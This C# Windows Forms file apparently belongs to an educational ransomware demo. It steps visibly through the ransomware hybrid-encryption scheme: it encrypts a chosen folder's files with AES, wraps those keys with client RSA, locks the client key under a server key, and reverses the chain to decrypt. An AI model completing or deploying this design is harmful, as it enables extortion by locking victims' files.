using RansomwareTutorial.Controllers;
using RansomwareTutorial.Helpers;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RansomwareTutorial
{
    public partial class RansomTutorial : Form
    {
        private static string LockedDataLocation;
        private static string ClientRsaPublicKeyLocation;
        private static string ClientRsaPrivateKeyLocation;
        private static string ServerRsaPrivateKeyLocation;
        private static string ServerRsaPublicKeyLocation;
        private static string AESFilesLocation;
        private static string WorkingDirectoryLocation;
        private static string TargetFilesDirectory;
        private static int SleepMilliSeconds = 0;

        public RansomTutorial()
        {
            InitializeComponent();
        }

        public bool RefreshSettings()
        {
            if (String.IsNullOrWhiteSpace(txtWorkingDirectory.Text))
            {
                LogHelper.AddLog("Working Directory not set");
                return false;
            }

            if (String.IsNullOrWhiteSpace(txtTargetFilesDirectory.Text))
            {
                LogHelper.AddLog("Target Files Directory not set");
                return false;
            }

            WorkingDirectoryLocation = txtWorkingDirectory.Text;
            TargetFilesDirectory = txtTargetFilesDirectory.Text;

            LockedDataLocation = Path.Combine(TargetFilesDirectory, "LockedData");
            AESFilesLocation = Path.Combine(WorkingDirectoryLocation, "AES");

            ClientRsaPublicKeyLocation = Path.Combine(WorkingDirectoryLocation, "ClientRsaPublicKey.xml");
            ClientRsaPrivateKeyLocation = Path.Combine(WorkingDirectoryLocation, "ClientRsaPrivateKey.xml");
            ServerRsaPublicKeyLocation = Path.Combine(WorkingDirectoryLocation, "ServerRsaPublicKey.xml");
            ServerRsaPrivateKeyLocation = Path.Combine(WorkingDirectoryLocation, "ServerRsaPrivateKey.xml");

            if (!String.IsNullOrWhiteSpace(txtDelay.Text) && !int.TryParse(txtDelay.Text, out SleepMilliSeconds))
            {
                LogHelper.AddLog("Delay set is not valid. Value must be integer");
                return false;
            }

            return true;
        }

        #region Button_Click
        private void btnEncrypt_Click(object sender, EventArgs e)
        {
            try
            {
                LogHelper.AddLog("Starting Encryption");

                bool isHealthy = true;

                if (!RefreshSettings())
                    return;

                SetRadioButtonStatus(Status.CREATEPRIVATEKEYS);
                EncryptionProcessor.SetupWorkingItems(WorkingDirectoryLocation, AESFilesLocation, LockedDataLocation, ClientRsaPublicKeyLocation, ClientRsaPrivateKeyLocation, ref isHealthy);
                SetRadioButtonStatus(Status.ENCRYPTFILES);
                EncryptionProcessor.LocateFilesAndEncrypt(TargetFilesDirectory, AESFilesLocation, LockedDataLocation, ref isHealthy);
                SetRadioButtonStatus(Status.ENCRYPTAESKEYS);
                EncryptionProcessor.LocateAESFilesAndEncrypt(ClientRsaPrivateKeyLocation, AESFilesLocation, ref isHealthy);
                SetRadioButtonStatus(Status.ENCRYPTCLIENTPRIVATEKEY);
                EncryptionProcessor.LocateClientRSAPrivateKeyAndEncrypt(ClientRsaPrivateKeyLocation, ServerRsaPublicKeyLocation, ref isHealthy);
                SetRadioButtonStatus(Status.IDLE);
            }
            catch (Exception ex)
            {
                LogHelper.AddLog(ex.ToString());
            }
        }

        private void btnDecrypt_Click(object sender, EventArgs e)
        {
            try
            {
                LogHelper.AddLog("Starting Decryption");

                bool isHealthy = true;

                if (!RefreshSettings())
                    return;

                SetRadioButtonStatus(Status.GETKEYFROMSERVER);
                var rsaServerPrivateKey = DecryptionProcessor.GetPrivateKeyFromServer(ServerRsaPrivateKeyLocation, ref isHealthy);

                SetRadioButtonStatus(Status.DECRYPTPRIVATEKEY);
                DecryptionProcessor.LocateClientPrivateKeyAndDecrypt(ClientRsaPrivateKeyLocation, rsaServerPrivateKey, ref isHealthy);
                SetRadioButtonStatus(Status.DECRYPTAESKEY);
                DecryptionProcessor.DecryptAESKeys(AESFilesLocation, ClientRsaPrivateKeyLocation, ref isHealthy);
                SetRadioButtonStatus(Status.DECRYPTFILES);
                DecryptionProcessor.DecryptLockedFiles(AESFilesLocation, LockedDataLocation, ref isHealthy);
                SetRadioButtonStatus(Status.IDLE);

            }
            catch (Exception ex)
            {
                LogHelper.AddLog(ex.ToString());
            }
        }

        private void btnGenerateServerKey_Click(object sender, EventArgs e)
        {
            this.RefreshSettings();

            var rsaKey = CryptoHelper.GenerateRSAKeys();

            if (Directory.Exists(WorkingDirectoryLocation))
            {
                File.WriteAllText(ServerRsaPublicKeyLocation, rsaKey.PublicKey);
                File.WriteAllText(ServerRsaPrivateKeyLocation, rsaKey.PrivateKey);
            }
        }
        #endregion

        public enum Status
        {
            IDLE,
            CREATEPRIVATEKEYS,
            ENCRYPTFILES,
            ENCRYPTAESKEYS,
            ENCRYPTCLIENTPRIVATEKEY,
            GETKEYFROMSERVER,
            DECRYPTPRIVATEKEY,
            DECRYPTAESKEY,
            DECRYPTFILES
        }

        public void SetRadioButtonStatus(Status status)
        {
            Thread.Sleep(SleepMilliSeconds);

            if (cbPause.Checked)
            {
                MessageBox.Show($"Click to continue - Status : {status.ToString()}");
            }

            switch (status)
            {
                case Status.IDLE:
                    rdIdle.Checked = true;
                    break;
                case Status.CREATEPRIVATEKEYS:
                    rdLocalRsaKeys.Checked = true;
                    break;
                case Status.ENCRYPTFILES:
                    rdEncryptData.Checked = true;
                    break;
                case Status.ENCRYPTAESKEYS:
                    rdEncryptAES.Checked = true;
                    break;
                case Status.ENCRYPTCLIENTPRIVATEKEY:
                    rdEncryptPrivateKey.Checked = true;
                    break;
                case Status.GETKEYFROMSERVER:
                    rdGetKeyFromServer.Checked = true;
                    break;
                case Status.DECRYPTPRIVATEKEY:
                    rdDecryptLocalKey.Checked = true;
                    break;
                case Status.DECRYPTAESKEY:
                    rdDecryptAESKeys.Checked = true;
                    break;
                case Status.DECRYPTFILES:
                    rdDecryptFiles.Checked = true;
                    break;
            }
        }
    }
}
